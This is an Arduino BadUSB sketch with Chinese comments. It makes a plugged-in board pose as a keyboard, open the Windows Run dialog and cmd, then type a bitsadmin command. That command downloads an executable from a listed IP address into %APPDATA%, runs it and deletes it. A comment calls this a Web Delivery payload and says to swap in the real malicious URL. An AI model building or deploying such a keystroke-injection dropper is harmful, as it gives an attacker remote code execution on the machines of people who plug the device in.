#include<Keyboard.h>

void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(200); 
  Keyboard.press('r');//r键 
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("cmd.exe");
  delay(200); 
  Keyboard.println("cmd.exe /c bitsadmin /transfer 270c http://192.168.154.131:80/b %APPDATA%\270c.exe&%APPDATA%\270c.exe&del %APPDATA%\270c.exe");  //访问Web Delivery-bitsadmin，恶意网址按照实际更改
  delay(200); 
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}